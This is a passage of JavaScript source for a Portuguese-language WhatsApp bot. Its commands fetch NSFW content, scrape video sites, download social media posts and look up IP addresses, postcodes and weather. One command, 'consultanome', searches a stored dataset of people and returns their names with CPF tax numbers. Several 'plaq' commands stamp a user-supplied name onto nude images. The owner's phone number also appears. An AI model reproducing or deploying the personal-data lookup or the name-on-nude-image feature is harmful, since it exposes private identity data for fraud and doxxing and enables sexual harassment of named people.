                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                try {

                    hentaiporno = await getBuffer(`https://p7api.xyz/api/hentai/${command}?apikey=${setting.apikey}`, `${command}`)
                    let message = await prepareWAMessageMedia({ image: hentaiporno }, { upload: conn.waUploadToServer })
                    const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                        templateMessage: { hydratedTemplate: { imageMessage: message.imageMessage, hydratedContentText: '😏', hydratedButtons: [{ urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } }, { quickReplyButton: { displayText: '😳 PRÓXIMA 😳', id: `${prefix + command}` } }] } }
                    }), { userJid: m.chat, quoted: m })
                    conn.relayMessage(m.chat, template.message, { messageId: template.key.id })
                } catch { reply('erro ao enviar') }

                break

            case 'hentaivid':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                reply('Aguarde...')
                try {

                    buffuy = await getBuffer(`https://p7api.xyz/api/hentai/hnt_gifs?apikey=${setting.apikey}`)
                    amjg = await webp_mp4(buffuy)
                    mp4m = await getBuffer(amjg)
                    await conn.sendMessage(m.chat, { video: mp4m, gifPlayback: true, filename: `hentai.gif`, caption: "Tai seu video safrado", buttons: [{ buttonId: `${prefix + command}`, buttonText: { displayText: '😳 PRÓXIMO 😳' }, type: 1 }], headerType: 4 }, { quoted: m })/////////////

                } catch { reply('erro ao enviar') }
                break


            case 'plaq':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (args.length < 1) return reply(`${prefix}plaq e digite o seu nome`)
                teks = body.slice(6)
                if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
                reply(enviar.espere)
                buffer = await getBuffer(`https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21`)
                conn.sendMessage(from, { image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* ' }, { quoted: m })

                break

            case 'plaq2':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (args.length < 1) return reply(`${prefix}plaq2 e digite o seu nome`)
                teks = body.slice(7)
                if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
                reply(enviar.espere)
                buffer = await getBuffer(`https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=${teks}`)
                conn.sendMessage(from, { image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* ' }, { quoted: m })
                break

            case 'plaq3':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (args.length < 1) return reply(`${prefix}plaq3 e digite o seu nome`)
                teks = body.slice(7)
                if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
                reply(enviar.espere)
                buffer = await getBuffer(`https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=${teks}&text.0.outline.blur=63`)
                conn.sendMessage(from, { image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* ' }, { quoted: m })
                break

            case 'plaq4':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (args.length < 1) return reply(`${prefix}plaq4 e digite o nome`)
                teks = body.slice(7)
                if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
                reply(enviar.espere)
                buffer = await getBuffer(`https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=${teks}&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter`) //api
                plaq = ` *Plaquinha feita ✓* `
                conn.sendMessage(from, { image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* ' }, { quoted: m })
                break

            case 'plaq5':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (args.length < 1) return reply(`${prefix}plaq5 e digite onome`)
                teks = body.slice(7)
                if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
                reply(enviar.espere)
                buffer = await getBuffer(`https://umethroo.sirv.com/peito1.jpg?text.0.text=${teks}&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700`)
                conn.sendMessage(from, { image: buffer, sendEphemeral: true, thumbnail: null, caption: ' *Plaquinha feita ✓* ' }, { quoted: m })
                break


            case 'placaloli':
                if (!q) return reply(enviar.wrongFormat)
                reply('Aguarde..')
                lod = await fetchJson(`https://nekobot.xyz/api/imagegen?type=kannagen&text=${q}`)
                let mediamv = await getBuffer(lod.message)
                let encmediamv = await conn.sendImageAsSticker(m.chat, mediamv, m, { packname: criadorfig, author: descfig })
                await fs.unlinkSync(encmediamv)
                break

            case 'apkmody': {


                if (!c) return reply(mess.erro_c)
                m.reply(enviar.espere)
                apkmody(c).then(async (sexo2) => {
                    let sexo = `*----「 🪙 *_APK MODY_* 💰 」----*\n\n`
                    sexo += `*📕 Nome : ${sexo2.nome}\n`
                    sexo += `*📍 Link : ${sexo2.link}\n`
                    sexo += `* 📃 Descrição : ${sexo2.descrição}\n`
                    conn.sendMessage(m.chat, { image: { url: sexo2.img }, caption: sexo }, { quoted: m })
                })
            }

                break

            case 'donos':
                dono = `Lista de donos da ${setting.NomeDoBot}\nDono oficial: ${setting.numerodono.split('@')[0]}\nTotal : ${numerodonos.length}\n┏━⬣\n`
                no = 0
                for (let donos of numerodonos) {
                    no += 1
                    dono += `┣❲${no.toString()}❳=❲@${donos.split('@')[0]}\n`
                }
                dono += `┗━⬣`
                await conn.sendMessage(from, { text: dono.trim(), contextInfo: { "mentionedJid": numerodonos } }, { quoted: m })
                break

            case 'owner':
            case 'creator':
            case 'criador':
            case 'dono': {


                let vcard =
                    'BEGIN:VCARD\n'
                    + 'VERSION:3.0\n'
                    + 'N:;Neo Tecnolog;;;\n'
                    + 'FN:Neo Tecnolog\n'
                    + 'item1.TEL;waid=558198539583:+55 81 9853-9583\n'
                    + 'item1.X-ABLabel:Celular\n'
                    + 'END:VCARD'

                await conn.sendMessage(m.chat, { contacts: { displayName: 'Neo Tecnolog', contacts: [{ vcard }] } }, { quoted: selo })
                await reply('O contato dele caso você use imune https://wa.me/558198539583')
            }

                break


            case '':
            case 'comandos':
            case 'menu': {

                let message = await prepareWAMessageMedia({ image: fs.readFileSync('./logo/logo.jpg') }, { upload: conn.waUploadToServer })
                const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            imageMessage: message.imageMessage,
                            hydratedContentText: menu(prefix, NomeDoBot, pushname, `${date + "/" + month + "/" + year}`),
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: '⚙️ CONTATOS',
                                    url: 'https://contate.me/NeoTecnolog'
                                }
                            }, { urlButton: { displayText: '⚙️ GRUPO BOT', url: 'https://tinyurl.com/27z7ju85' } }, {
                                quickReplyButton: {
                                    displayText: '🅟🅘🅝🅖',
                                    id: `${prefix}ping`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '🅒🅡🅘🅐🅓🅞🅡',
                                    id: `${prefix}criador`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '🅒🅞🅜🅟🅡🅐🅡 🅑🅞🅣',
                                    id: `${prefix}comprabot`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat, quoted: selo })
                conn.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }

                break

            case 'play2':
                var t = args.join(' ')
                if (!t) return m.reply('Cadê o nome da música?')
                var oi = await fetchJson(`http://p7api.xyz/api/ytplay?nome=${t}&apikey=${setting.apikey}`)
                //var imgapi = await getBuffer(oi.resultado.thumb)
                var infoapi = `📕Nome : ${oi.resultado.título}\n👁️Visualizações : ${oi.resultado.visualizações}\n⏰Publicado : ${oi.resultado.publicado}\n🎥Canal : ${oi.resultado.canal}\n\n_*!--aguarde o envio do arquivo--!*_`
                //var resultado_audio = await getBuffer(oi.resultado.link)
                enviarArquivoDoLink(m.chat, oi.resultado.thumb, infoapi, m)
                conn.sendMessage(m.chat, { audio: { url: oi.resultado.link } }, { mimetype: 'audio/mpeg' }, { quoted: m })
                break

            case 'tiktok':
                if (!c) return m.reply(`Use assim ${command} link`)
                if (!isUrl(c)) return m.reply('preciso de um link')
                if (!c.includes('tiktok')) return m.reply('o link precisa ser do tiktok')
                m.reply(enviar.espere)
                xfar.Tiktok(c).then(data => {
                    conn.sendMessage(m.chat, {
                        video: { url: data.medias[0].url },
                        caption: `${data.title}\n\nVocê pode convertê-lo em vídeo sem marca d,'água ou áudio, pressione o botão abaixo para alterá-lo!`,
                        buttons: [{ buttonId: `${prefix}tiktoknowm ${c}`, buttonText: { displayText: "Sem marca d'água" }, type: 1 },
                        { buttonId: `${prefix}tiktokaudio ${c}`, buttonText: { displayText: "Audio.mp3" }, type: 1 }],
                        footer: "Criado por @gustavonup"
                    }, { quoted: m })
                }).catch(() => m.reply('ocorreu um erro :/'))
                break

            case 'tiktoksemmarca':
            case 'tiktoknowm':
                if (!c) return m.reply(`Use assim ${command} link`)
                if (!isUrl(c)) return m.reply('preciso de um link')
                if (!c.includes('tiktok')) return m.reply('o link precisa ser do tiktok')
                m.reply(enviar.espere)
                hxz.ttdownloader(c).then(data => {
                    conn.sendMessage(m.chat, { video: { url: data.nowm } }, { quoted: m })
                }).catch(() => m.reply('ocorreu um erro :/'))
                break
            case 'tiktokaudio':
                if (!c) return m.reply(`Use assim ${command} link`)
                if (!isUrl(c)) return m.reply('preciso de um link')
                if (!c.includes('tiktok')) return m.reply('o link precisa ser do tiktok')
                m.reply(enviar.espere)
                hxz.ttdownloader(c).then(data => {
                    conn.sendMessage(m.chat, { audio: { url: data.nowm }, mimetype: 'audio/mp4' }, { quoted: m })
                }).catch(() => m.reply('ocorreu um erro :/'))
                break

            case 'ig':
            case 'igdl':
            case 'instagram':
                if (!c) return reply('Cadê o link??')
                if (!isUrl(c)) return m.reply('preciso de um link')
                if (!c.includes('instagram')) return m.reply('o link precisa ser do insta')
                if (/story/.test(q)) return reply('Não Pode ser Story')
                if (/storie/.test(q)) return reply('Não Pode ser Story')
                var { igDownloader } = require('./lib/igdown')
                try {
                    res = await igDownloader(`${c}`).catch(e => {
                    })
                    enviarArquivoDoLink(m.chat, `${res.result.link}`, `${res.result.desc}`)
                } catch { m.reply('Erro Tente Novamente ou Outro link') }
                break
            case 'xv':
            case 'xvideos':
            case 'xvideosbusca':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (!c) return reply('Cadê o nome??')
                var normalize = c.split(' ').join('+').split('%20').join('');
                var search = normalize.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
                var normalize = c.split(' ').join('+').split('%20').join('');
                var search = normalize.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
                var url = `https://www.xvideos.com/?k=${search}`;
                var data = [];
                var xv = [];
                request(url, (err, req, body) => {
                    if (err) return m.reply(err);
                    const regExp = /<\/div><div class=\".+?\"><p class=\".+?\"><a href=\".+?\" .+? <span class=\".+?\"><\/span>/g;
                    const datas = body.match(regExp);
                    data.push(...datas);
                    var regExp2 = /\"\/.+?\"/g;
                    var regExp3 = /title=\".+?\">/g;
                    // var regExp4 = /\"duration\">.+?/g;
                    for (let index of data) {
                        var reg = index.match(regExp2);
                        var reg2 = index.match(regExp3);
                        var reg3 = reg2[0].split('title=').join('').split('>').join('');
                        xvideokk = JSON.parse(reg[0])[Math.floor(Math.random() * JSON.parse(reg[0]).length)]
                        //enviarArquivoDoLink(m.chat, `https://www.xvideos.com${JSON.parse(reg[0])}`, 'pronto')
                        //m.reply(`https://www.xvideos.com${JSON.parse(reg[0])}`)
                        info = `
nome : ${JSON.parse(reg3)}

link : https://www.xvideos.com${JSON.parse(reg[0])}`
                        conn.sendMessage(m.chat, {
                            text: info
                        }, { quoted: m })
                    }
                });
                break
            case 'xvdown':
            case 'xvdl':
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)
                if (!c) return reply('Cadê o link??')
                if (!isUrl(c)) return m.reply('preciso de um link')
                if (!c.includes('xvideos')) return m.reply('o link precisa ser do tiktok')
                m.reply('baixando o vídeo aguarde...')
                var data = [];
                request(c, (err, req, body) => {
                    if (err) return console.log(err);
                    try {
                        var regExp = /html5player\.setVideoTitle\(\'.+?\'\)/g;
                        var _title = body.match(regExp)[0].split('html5player.setVideoTitle(\'').join('').split('\')').join('');
                        var url_video = /html5player\.setVideoUrlHigh\(\'.+?\'\)/g;
                        var _url_video_raw = body.match(url_video)[0].split('html5player.setVideoUrlHigh').join('').split('(').join('').split(')').join('').split('\'').join('');
                        var duration1 = /class=\"duration\">.+?<\/span>/g;
                        var duration = body.match(duration1)[0].split('class=\"duration\">').join('').split('<').join('').split('span>').join('').split('/').join('');
                        var MinOurSec = duration.endsWith(' min') ? ' minutes' : '' || duration.endsWith(' sec') ? ' seconds' : '';
                        var _duration = duration.split(' ')[0] + MinOurSec;
                        var viewsV = /class=\"mobile-hide\">.+?<\/strong>/g;
                        var _views = body.match(viewsV)[0].split('class=\"mobile-hide\">').join('').split('</strong>').join('');
                        var _owner = /html5player\.setUploaderName\(\'.+?\'\)/g;
                        var _ownerVideo = body.match(_owner)[0].split('html5player.setUploaderName(\'').join('').split('\')').join('');
                        info = `nome : ${_title}\nduração : ${_duration}\nvisualizações : ${_views}`
                        enviarArquivoDoLink(m.chat, _url_video_raw, info)
                    } catch (a) {
                        return m.reply('vídeo não encontrado')
                    }
                });
                break
            case 'storyigdl':
            case 'instagramstory':
            case 'instastory':
            case 'instastorie':
            case 'instastori': {
                if (!isPremium) return reply(enviar.msg.premium)

                if (!c) return m.reply(`Exemplo: ${prefix + command} alok`)
                //if (!args[1].includes('...') && !args[1].includes('...')) return reply('erro na api')
                try {
                    m.reply(`Baixando Stories de: ${c} ...`)

                    get_result = await fetchJson(`https://p7api.xyz/api/igstorydl?nome=${c}&apikey=${setting.apikey}`)
                    get_result = get_result.resultado
                    for (var x of get_result) {
                        tipo = x.type
                        if (tipo.match(`image`)) {

                            await conn.sendMessage(
                                m.chat,
                                { image: { url: x.url } }
                            )

                        }
                        if (tipo.match(`video`)) {
                            await conn.sendMessage(
                                m.chat,
                                { video: { url: x.url } }
                            )
                        }
                    }

                } catch {
                    m.reply('Não Foi Possivel Encontrar, Verifique se existe storyes, se a conta não é privada ou nome de usuário não esta incorreto.')
                }

            }
                break
            case 'consultanome':
                if (!isPremium) return reply(enviar.msg.premium)
                if (!text) return reply(`[❗] Use assim : ${prefix + command} fabio`)
                try {
                    const regex = new RegExp(text, 'gi');

                    const rv = dados.pessoa.filter(
                        record => record.nome.match(regex)
                    );
                    let ddados = `┌ ◪ *DADOS*\n└ *Total:* ${rv.length}\n\n`
                    for (let i = 0; i < rv.length; i++) {
                        ddados += `───────────────\n┌ ❏ *nome:* ${rv[i].nome}\n└ ❏ *cpf:* ${rv[i].cpf}\n\n`
                    }
                    enviarbuton(m.chat, ddados, `By: ${NomeDoBot}`, [{ urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } }])
                } catch { reply('Não Foi Possivel Encontrar o Nome') }
                break


            case 'cpf':
            case 'cnpj':
            case 'cpf2':
            case 'cpf3':
            case 'placa':
            case 'cns':
            case 'tel':
            case 'telefone':
            case 'rg':
            case 'dados':
            case 'nome':
                await reply('O BOT NÃO TEM A FUNÇÃO ATIVA.')

                break

            case 'metadinha': {
                if (!isPremium) return reply(enviar.msg.premium)
                reply(mess.wait)
                try {
                    let anu = await fetchJson(`https://p7api.xyz/api/anime/metadinha?apikey=${setting.apikey}`)
                    conn.sendMessage(m.chat, { image: { url: anu.resultado.metadinha_feminina }, caption: `masculina:` }, { quoted: m })
                    conn.sendMessage(m.chat, { image: { url: anu.resultado.metadinha_masculina }, caption: `feminina:` }, { quoted: m })
                } catch { reply('ERRO') }
            }
                break

            case 'encurtarlink':
            case 'encurtalink':
                if (!isPremium) return reply(enviar.msg.premium)

                if (!text) return reply(`Texto?\n\nEx : ${prefix + command} https://p7api.xyz/`)
                try {
                    link = args[0]
                    anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
                    reply(`${anu.data}`)
                } catch (e) {
                    emror = String(e)
                    reply(`${e}`)
                }
                break

            case 'verhtml':
                if (!isPremium) return reply(enviar.msg.premium)

                if (q) {
                    fetch(q).then(res => res.text())
                        .then(bu => {
                            reply(bu)
                        })
                } else if (quoted) {
                    fetch(quoted.text).then(res => res.text())
                        .then(bu => {
                            reply(bu)
                        })
                }
                break

            case 'covidbr':
                try {

                    anu = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?covidbr`)
                    po = `*Covid Brasil* \n
📊 *Total de Casos:* ${anu.resultado.casos}\n
📊 *Casos Confirmados:* ${anu.resultado.confirmados}\n
📊 *Mortes:* ${anu.resultado.mortos}\n
📊 *Casos Recuperados:* ${anu.resultado.recuperados}\n
📊 *Ultima Atualização:* ${anu.resultado.dados_atualizado.split("T")[0]}`
                    await conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/5cb91fc63c85c738adcc6.png' }, caption: po }, { quoted: m })
                } catch {
                    reply('Não foi possível Obter A Info')
                }
                break


            case 'gerarcpf':
                if (!isPremium) return reply(enviar.msg.premium)
                addFilter(sender)
                post = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?gerarcpf`).then(async (x) => {
                    sendiuiu = `*✅Cpf gerado: ${x.result.result}*`
                    reply(sendiuiu)
                })
                break

            case 'validarcpf':
                if (!isPremium) return reply(enviar.msg.premium)
                addFilter(sender)
                teks = args.join(" ")
                post = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?validacpf=${teks}`).then(async (x) => {
                    send = `*⚠️STATUS: ${x.result.result}*`
                    reply(send)
                })
                break

            case 'gerarcnpj':
                if (!isPremium) return reply(enviar.msg.premium)
                addFilter(sender)
                post = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?gerarcnpj`).then(async (x) => {
                    send = `*✅Cnpj gerado: ${x.result.result}*`
                    reply(send)
                })
                break

            case 'validarcnpj':
                if (!isPremium) return reply(enviar.msg.premium)
                addFilter(sender)
                teks = args.join(" ")
                post = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?validacnpj=${teks}`).then(async (x) => {
                    send = `*⚠️STATUS: ${x.result.result}*`
                    reply(send)
                })
                break

            case 'encurtalink':
                if (!isPremium) return reply(enviar.msg.premium)
                if (args.length < 1) return reply(`Exemplo:\n${prefix}encurtalink https://youtube.com/c/p7conteudos`)
                try {
                    link = args[0]
                    anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
                    reply(`${anu.data}`)
                } catch (e) {
                    emror = String(e)
                    reply(`${e}`)
                }
                break

            case 'mediafire':
                if (args.length < 1) return reply('Digite o link do arquivo que deseja buscar no Mediafire')
                if (!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Link invalido')
                reply(enviar.espere)
                teks = args.join(' ')
                const resm = await mediafireDl(teks)
                result = `*「  MEDIAFIRE DOWNLOAD  」*

*Nome :* ${resm[0].nama}
*Tamanho :* ${resm[0].size}
*Link :* ${resm[0].link}`
                reply(result)
                blabla = await getBuffer(resm[0].link)
                conn.sendMessage(from, { document: blabla, mimetype: `${resm[0].mime}`, fileName: `${resm[0].nama}` }, { quoted: m }).catch(e => {
                    reply('ERROR')
                })
                break

            case 'ip':
            case 'localizaip':
                if (!c) return m.reply('preciso do ip')
                //if (isNaN(args[0])) return m.reply('Preciso de um ip em formato de número')
                if (c.length < 20) {
                    try {
                        reply('Aguarde...')
                        //if (c.includes('.') && args[0].includes('-')) return m.reply("....")
                        api = await fetchJson(`http://ip-api.com/json/${c}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`)
                        psq = `*----「 📟 IP 📟 」----*\n\n`
                        psq += `*Status :* ${api.status ? api.status : 'IP PRIVADO'}\n`
                        psq += `*Ip :* ${api.query ? api.query : 'INDEFINIDO'}\n`
                        psq += `*Continente :* ${api.continent ? api.continent : 'global'}\n`
                        psq += `*Continente Sigla :* ${api.continentCode ? api.continentCode : 'GLOBAL'}\n`
                        psq += `*País :* ${api.country ? api.country : 'global'}\n`
                        psq += `*País Sigla :* ${api.countryCode ? api.countryCode : 'GLOBAL'}\n`
                        psq += `*Região :* ${api.region ? api.region : 'Global'}\n`
                        psq += `*Nome da Região :* ${api.regionName ? api.regionName : 'Global'}\n`
                        psq += `*Cidade :* ${api.city ? api.city : 'Global'}\n\n`
                        psq += `*Latitude :* ${api.lat ? api.lat : '0'}\n`
                        psq += `*Longitude :* ${api.lon ? api.lon : '0'}\n`
                        psq += `*Tempo real :* ${api.timezone ? api.timezone : 'UTC +0'}\n`
                        psq += `*Isp :* ${api.isp ? api.isp : 'PUBLICO'}\n`
                        psq += `*Org :* ${api.org ? api.org : 'IP PUBLICO'}`

                        const templateButtonsoisb = [
                            { index: 1, urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } },
                        ]
                        const buttonMessageoidasd = {
                            image: { url: 'https://i.ibb.co/hCbR6Yw/what-is-my-ip-featured-800x400.png' },
                            caption: psq,
                            footer: `By: ${NomeDoBot}`,
                            templateButtons: templateButtonsoisb
                        }


                        conn.sendMessage(m.chat, buttonMessageoidasd)
                    } catch { reply('Deu Erro tenta Novamente') }
                } else {
                    m.reply('o ip inserido e invalido ou o número não corresponde')
                }
                break


            case 'ddd':
                if (c.length < 1) return reply(`Use um DDD Exemplo: ${prefix + command} 81`)
                if (c.length > 2) return reply(`Use Valido Exemplo: ${prefix + command} 81`)

                if (isNaN(c)) return reply(`Use um DDD`)
                if (c < 11) return reply('Insira um DDD Valido')

                ddd = body.slice(5)
                try {
                    ddds = await axios.get(`https://p7api.gustavonunes5.repl.co/api/?ddd=${ddd}`)
                    dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
                    for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ⪧ *${ddds.data.cities[i]}*\n` }

                    const templateButtonsoisbnib = [
                        { index: 1, urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } },
                    ]
                    const buttonMessageoidasdni = {
                        text: `${dddlist}`,
                        footer: `By: ${NomeDoBot}`,
                        templateButtons: templateButtonsoisbnib
                    }


                    conn.sendMessage(m.chat, buttonMessageoidasdni)
                } catch { reply('Erro Insira um DDD Valido ou Tente Novamente.') }
                break

            case 'cep':
                if (!c) return m.reply('preciso do cep')
                if (isNaN(args[0])) return m.reply('Preciso de um ip em formato de número')
                if (c.length < 20) {
                    if (c.includes('.') && args[0].includes('-')) return m.reply("não adicione pontos ou -")
                    reply('Aguarde...')

                    api = await fetchJson(`https://viacep.com.br/ws/${c}/json/`)
                    if (api.cep === undefined) return reply('Insira um cep valido')
                    psq = `*----「 📟 CEP 📟 」----*\n\n`
                    psq += `*Cep :* ${api.cep}\n`
                    psq += `*Rua :* ${api.logradouro}\n`
                    psq += `*Complemento :* ${api.complemento}\n`
                    psq += `*Bairro :* ${api.bairro}\n`
                    psq += `*Localidade :* ${api.localidade}\n`
                    psq += `*Uf :* ${api.uf}\n`
                    psq += `*Ibge :* ${api.ibge}\n`
                    psq += `*Gia :* ${api.gia}\n\n`
                    psq += `*Ddd :* ${api.ddd}\n`
                    psq += `*Siafi :* ${api.siafi}\n`
                    const templateButtonsoisbn = [
                        { index: 1, urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } },
                    ]
                    const buttonMessageoidasdn = {
                        image: { url: 'https://i.ibb.co/GM0hpvh/EQl-UYDw-X0-AI1-Hb-N.jpg' },
                        caption: psq,
                        footer: `By: ${NomeDoBot}`,
                        templateButtons: templateButtonsoisbn
                    }


                    conn.sendMessage(m.chat, buttonMessageoidasdn)
                } else {
                    m.reply('o cep inserido e invalido ou o número não corresponde')
                }
                break

            case 'clima':
                if (args.length < 1) return reply(`Exemplo: ${prefix + command} São Paulo`)
                reply('Aguarde...')


                try {
                    anu = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?clima=${c}`)
                    po = `*Clima em ${anu.name}*\n
🧾Descrição: ${anu.weather[0].description.charAt(0).toUpperCase() + anu.weather[0].description.slice(1)}
🌡️ Temperatura : ${anu.main.temp}°c
🌡️ Sensação Térmica : ${anu.main.feels_like}°c
🌡️ Temperatura Min : ${anu.main.temp_min}°c
🌡️ Temperatura Max : ${anu.main.temp_max}°c
​💧​💨​ Umidade: ${anu.main.humidity}%
📊 Pressão Atmosférica: ${anu.main.pressure}hPa 
💨 Vel. Vento: ${anu.wind.speed}m/s
🧭💨 Direção do Vento: ${anu.wind.deg}º
🗺️ GEOLOCALIZAÇÃO    
📍País: ${anu.sys.country}
📍CIDADE: ${anu.name}
📍Cordenadas: ${anu.coord.lat}, ${anu.coord.lon}`

                    const templateButtonsois = [
                        { index: 1, urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } },
                    ]

                    const buttonMessageoidas = {
                        image: { url: `https://p7api.gustavonunes5.repl.co/api/?climaimg=${anu.weather[0].icon}` },
                        caption: po,
                        footer: `By: ${NomeDoBot}`,
                        templateButtons: templateButtonsois
                    }
                    await conn.sendMessage(m.chat, buttonMessageoidas)
                } catch {
                    reply('Não foi possível encontrar a cidade, país ou região')
                }
                break


            case 'celular':
                if (!c) return reply(`Qual celular você está procurando?`)
                teks = args.join(' ')
                reply('Aguarde Estou Pesquisando...')
                try {
                    anu = await fetchJson(`https://api-yogipw.herokuapp.com/api/search/gsmarena?query=${q}`)
                    const busca_celular =
                        `
📝 Titulo: ${anu.judul}
❗Última atualização: ${anu.rilis}
📱 Tamanho do celular: ${anu.ukuran}
⚡ Tipo: ${anu.type}
🗃️ Armazenamento: ${anu.storage}
📴 Tela: ${anu.display}
📳 Polegada: ${anu.inchi}
🔰 Resolução da câmera: ${anu.pixel}
📲 Resolução do video: ${anu.videoPixel}
💭 Ram do celular: ${anu.ram}
👤 Hardware do celular: ${anu.chipset}
⚠️ Bateria: ${anu.batrai}
🔋 Tipo da bateria: ${anu.merek_batre}`
                    wew = fs.readFileSync('./logo/logo.jpg')
                    const templateButtonsoisd = [
                        { index: 1, urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } },
                    ]

                    const buttonMessageoidasd = {
                        image: { url: `${anu.thumb ? anu.thumb : 'https://telegra.ph/file/ee3d20f40db415484fcc9.jpg'}` },
                        caption: `${busca_celular}`,
                        footer: `By: ${NomeDoBot}`,
                        templateButtons: templateButtonsoisd
                    }
                    await conn.sendMessage(m.chat, buttonMessageoidasd)
                } catch { reply('ERRO, Tente Novamente') }
                break

            case 'emoji':
            case 'semoji':
                if (!q) return reply(`Exemplo: ${prefix}emoji ☹️/whatsapp`)
                emot = q.split('/')[0]
                jemot = q.split('/')[1]
                if (jemot == 'apple') {
                    idemot = 0
                }
                else if (jemot == 'apple') {
                    idemot = 1
                }
                else if (jemot == 'google') {
                    idemot = 2
                }
                else if (jemot == 'samsung') {
                    idemot = 3
                }
                else if (jemot == 'microsoft') {
                    idemot = 4
                }
                else if (jemot == 'whatsapp') {
                    idemot = 5
                }
                else if (jemot == 'twitter') {
                    idemot = 6
                }
                else if (jemot == 'facebook') {
                    idemot = 7
                }
                else if (jemot == 'joypixels') {
                    idemot = 8
                }
                else if (jemot == 'openmoji') {
                    idemot = 9
                }
                else if (jemot == 'emojidex') {
                    idemot = 10
                }
                else if (jemot == 'messenger') {
                    idemot = 11
                }
                else if (jemot == 'lg') {
                    idemot = 12
                }
                else if (jemot == 'htc') {
                    idemot = 13
                }
                else if (jemot == 'mozilla') {
                    idemot = 14
                }
                else if (jemot == 'softbank') {
                    idemot = 15
                }
                else if (jemot == 'docomo') {
                    idemot = 16
                }
                else if (jemot == 'kddi') {
                    idemot = 17
                }
                else if (!jemot) {
                    return reply(`Retorne ex: ${prefix}emoji ☹️/whatsapp\n Para Ver a Lista de Opções: ${prefix}listaemoji`)
                }
                else {
                    return reply(`Retorne ex: ${prefix}emoji ☹️/whatsapp\n Para Ver a Lista de Opções: ${prefix}listaemoji`)
                }
                reply(enviar.espere)
                if (idemot == undefined) return reply('Não Consegui Identificar o Tipo do Emoji, Tente Novamente')
                try {
                    lodi = await fetchJson(`https://p7api.xyz/api/emogi?emogi=${encodeURIComponent(emot)}&numero=${idemot}&apikey=${setting.apikey}`)
                    mediamn = await getBuffer(lodi.resultado)
                    mediadisds = await conn.sendImageAsSticker(m.chat, mediamn, m, { packname: criadorfig, author: descfig })
                    await fs.unlinkSync(mediadisds)
                } catch { reply('Erro, Tente Novamente') }

                break

            case 'listaemoji':
                podakkda = `LISTA EMOJIS\n
    apple 
    google 
    samsung 
    microsoft 
    whatsapp 
    twitter 
    facebook 
    joypixels 
    openmoji
    emojidex 
    messenger 
    lg 
    htc 
    mozilla 
    softbank 
    docomo 
    kddi`
                conn.sendMessage(m.chat, { text: `${podakkda}` }, { quoted: m })
                break

            case 'playstore':
